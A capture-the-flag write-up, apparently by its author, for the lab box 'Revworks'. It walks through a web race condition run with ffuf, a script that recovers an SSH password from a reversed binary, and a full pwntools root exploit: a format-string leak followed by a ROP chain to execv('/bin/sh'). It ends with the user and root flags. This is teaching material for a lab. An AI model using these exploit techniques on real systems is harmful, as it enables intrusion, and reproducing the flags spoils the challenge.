# Revworks - Writeup

## Enumeration

### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 192.168.100.210 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 192.168.100.210
```

We find the classic 22,80 ports and 3000 open.

### Web

Browsing to port 80 automatically redirects us to revworks.thm. Add revworks.thm to the hosts file and browse to it. We come across a website that claims to be a "Creative Business for Reversing and Analysis".
![img](https://i.ibb.co/0JLprWf/revworks.png)

#### Winning Web Race

##### Enumeration

Browsing the base website, we see that we can `signup`(/users/sign_up) and `login` (/users/sign_in), so we create a test account `test@revworks.thm:password`, it automatically signs in the created user and now we have three more options, we can `purchase`(/site/purchasae), `transfer`(/site/transfer), `Edit profile` and we also have a `money` attribute which has a default value of 1. The `Edit profile` page is not useful to us.


Going to `/site/purchase`, we see the below page. We need our "money" value to be 10 in order to get access to the product. If we click buy, it just prompts that we do not have enough money to buy the product.
![img](https://i.ibb.co/mz4TqBL/purchase.png)


Going to `/site/transfer`, we see the below page. It says that we can only send/recieve to/from one user at this point. (Developer's note: This was made so that users simply do not create 10 or more accounts and transfer the amount to a single user, bypassing the race condition)
The email of the user has to follow the format `.*@revworks.thm`.


Transfering an amount of 1 to another user we created(`test1@revworks.thm:password`) and intercepting the request in burp, we see that the transfer was successful.

##### Exploitation

This setup allows us to perform a web race condiiton such that `test` makes a large number of asynchronous requests transfering to `test1` and the other user does the same. The end result that the server can not keep track of the transfers and transfers more amount to one or both users. This can be scripted in python3 using a module such as `grequests` but it is simpler and easier to do it using an already built fuzzing tool such as `ffuf`.

In one terminal, run the fuzzer with the cookie of `test` and with post data `test1@revworks.thm`.
In another terminal, run it with the cookie of `test1` and post data `test@revworks.thm`

Now, make sure that you're using the cookie of `test` with post data `test1` and vice versa.
Using cookie of `test`, we use
```bash
ffuf -c -u http://revworks.thm/site/transfer_money -X POST -w list.txt -H "Content-Type: application/x-www-form-urlencoded" -b "_revworks_session=sqVh5MO0L33NucU7e1Aggvb6ArHbA8g%2BUjcSmM3qwJU1X7EmRMXVuKK8q82buGs83%2F07UZqg%2BbHuxsjEEeOhCCA09PbMW9p9KO87PhWqXIu%2BDGC0zRLdsGV%2F6SMV5J%2B%2F4%2FXqyyFw68NI4swrCYBI1OMq4%2FHEpSvxU43NhJqP322P7giL4H6q9FCJRuh8D6%2FYJpnTewHyJqAc2xipXq40GJlm2R4RPfWmTnS7pj5rnYjEYwGZDOy3UwYuCJcMETViru7QxwSZyVBU%2FhxwyFHRIMKNZhv37oFwS6qzMb6f24CxaPcLSEZCxCjR%2BWQ6Hp6EqYoEK6imyvn%2BGoBkzLlevmHJD8eh8o5jtP4EDXkve3EtQIKADQiyVB9v9STX9Mo9lz5IfC92IccL--2Vi8n00asZ2J4BP8--PwXNIij%2FnP6%2FqS5YxaI%2Fwg%3D%3D" -d "email=test1@revworks.thm&amount=FUZZ" -fc 302
```
where list.txt is generated using `yes 1 | head -n 10000 > list.txt` in bash.

Using cookie of `test1`, we use
```bash
ffuf -c -u http://revworks.thm/site/transfer_money -X POST -w list.txt -H "Content-Type: application/x-www-form-urlencoded" -b "_revworks_session=gAOnqhA2aHLiNpPTTeucV5WO2wDrnhEiyFjEdELnpiqvWPOtHAsg%2BlXVARwd3EnfgaVsbHuLTINGZtFrtorq8%2BWpoEKLjhjQKug6WSSPvh2G9k6GqL8zKvtpzI4V9pn7cW2bRJv5HlHK8n6o25YGnm%2FFHlKPu4mtvwZ6z0nXKg02%2Bv%2B2koADIS%2BPIBi2T9Ja2kZ5FSL%2F21IFro3HwVNZVSgP2Mt0UunSg%2BzNP2Un5V7KtBKOZSVhLrG7PBAgcbCg1kqc4xwuYrU530Pp2obhCmiDrg%2BeySZel8N0L6QILwDOYdF0XLlt7LFmxeOtrYLcp%2BCeZy3aG6xYcSIwEdUqk5CdOblCYSrEqX4rKTjnICnBkZBYMdQkI2HM1QalS8%2Fu%2FsnwK%2B7YK0xA--REMd5Ilr07l2nhRh--eAvZKw%2BwUdtSHpDdz%2BKtKA%3D%3D" -d "email=test@revworks.thm&amount=FUZZ" -fc 302
```
the both commands should be run as close as possible.

Running these for one or two minutes should result in one or both of the users having >= 10 amount on the site. (Depending on the setup, this may vary, but I had consistent results running the webapp in a VM and my local machine)

### Reversing

Heading over to `/site/purchase`, we download the `PasswordGenerator` program, run it and open it up in ida free.

The program has two functions, `generatePassword` and `checkHash`. 
- `generatePassword` takes in the length of the password(from 0-20) and makes a random password which isn't useful for us. 
- `checkHash` function is interesting, it supposedly needs an ssh keyfile to recover the password(random id_rsa hash is used here).

The `checkHash` function reads in a file, computes its SHA1 hash and compares it against the known hash if it matches, it will show us the password. Since, we do not have the keyfile and extracting+bruteforcing the hash itself isn't feasible, we will reverse the part of the `checkHash` function which shows the password. It's decompilation by ida is shown below:
![img](https://i.ibb.co/y5PGL6B/function.png)

here the values for secret and key are `secret="zeeshan"`,
`key = [0x29, 0x03, 0x04, 0x03, 
		0x1e, 0x03, 0x24, 0x66,
		0xf1, 0x1d, 0x18, 0x11,
		0x06, 0x0a, 0x4d, 0x3d,
		0xb9, 0x57]`

We can use the following script to get the password,
```py
#!/usr/bin/env python3

secret = "zeeshan\x00"
key = [
  0x29, 0x03, 0x04, 0x03, 
  0x1e, 0x03, 0x24, 0x66,
  0xf1, 0x1d, 0x18, 0x11,
  0x06, 0x0a, 0x4d, 0x3d,
  0xb9, 0x57]

password = ""
for i in range(18):
  password += chr(key[i] ^ (ord(secret[i & 7]) + i))

print(f"{password = }")
```
which gives us a password `SecurePassword123!`

Bonus Solve: There is also a `ptrace` checker in `checkHash` so that calling the function in gdb is harder but it's still possible to step over the function call and set the result value to be `1` and simply have the program print out the password.

### User

With the password, we can ssh to the machine. We have three users from the main website page, trying all
of them we see that we can login as stephen with the above password.

### Root
Running `sudo -l` we see that we have `/manager`. We can use the following python3 script to exploit the binary and get a shell on the box, I've tried to add as much comments as possible. The program itself is very simple, `main` function reads in your input and prints it out, `vuln` function uses `scanf` too which allows you to hijack control flow and get a shell.

The program has all protections enabled.

The libc used for the exploit is copied using `scp` from the remote host.
`pwninit` has been used to patch the program to use the remote libc.

```py
#!/usr/bin/env python3
from pwn import * 
context.arch = "amd64"
# context.log_level = "debug"
# gdb debugging
gdbscript="""
b *vuln+105
c
"""
if args.REMOTE:
	shell = ssh(host="revworks.thm", user="stephen", password="SecurePassword123!")
	io = shell.process(["sudo","/manager"])
	elf = ELF("./manager_patched")
	libc = ELF("./libc.so.6")
else:
	io = process("./manager_patched")
	# gdb.attach(io, gdbscript=gdbscript)
	elf = io.elf
	libc = io.elf.libc

# format string payload to leak 
# program address, canary and libc addr respectively
payload = b'%133$lx-%25$lx-%3$lx-%58$lx'
io.sendline(payload)

io.recvuntil(b"following:")
io.recvline()

leak = io.recvline().decode().strip().split('-')
addr = int(leak[0], 16)
canary = int(leak[1], 16)
libc_addr = int(leak[2], 16)
stack_addr = int(leak[3], 16) 

stack_ret = stack_addr - 0x1b0

# setting elf base because PIE is enabled
elf.address = addr - 0x40
# setting libc base becasue ASLR is enabled
libc.address = libc_addr - 0x114a37 + 0x69c0
log.info(f"elf base is at: {hex(elf.address)}")
log.info(f"elf canary is : {hex(canary)}")
log.info(f"libc base is at: {hex(libc.address)}")
log.info(f"stack addr is at: {hex(stack_ret)}")

# badchars because scanf terminates on whitespace etc.,
rop = ROP(libc, badchars=b'\x08\x09\x10\x0c\x0d\x20')

sleep(0.5)
# correcting canary with the same value
payload = b"A"*40
payload += p64(canary)
payload += b"A"*8

payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))

payload += p64(rop.find_gadget(['pop rsi', 'ret'])[0])
payload += p64(0)

payload += p64(libc.symbols['execv'])

io.sendline(payload)

io.interactive()
```
I used `execv` instead of `system` here because the address for system had `0x0d` in it so it was not possible to write it using scanf(it is still possible to `read`(libc.sym.read) in a second payload from stdin which contains `system` and execute it but `execv` is simpler for our purposes)

`user.txt:243f92599bc872c99e1ea00ac1e3aa4f`
`root.txt:320aec873758ba547c1a463b07e61269`

#### That is it for the box, hope you enjoyed and learned something new. I had a lot of fun of making it :)
------------------------------------------------------------------------------------------------------